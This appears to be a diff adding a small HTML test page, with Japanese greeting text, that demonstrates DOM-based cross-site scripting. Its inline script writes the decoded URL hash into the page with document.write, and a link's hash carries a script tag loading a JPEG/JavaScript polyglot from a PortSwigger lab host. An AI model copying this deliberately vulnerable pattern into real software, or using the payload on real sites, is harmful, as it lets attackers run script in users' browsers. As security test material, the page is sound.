@@ -1,0 +1,8 @@
+<!DOCTYPE html><head><meta charset="utf-8"></head>
+<body>
+<p>こんにちは。<a href='#<script charset="ISO-8859-1" src="http://portswigger-labs.net/polyglot/jpeg/xss.jpg"></script>' target=_blank>リクエスト</a></p>
+<script>
+  document.write(decodeURI(location.hash.slice(1)));
+</script>
+</body>
+</html>
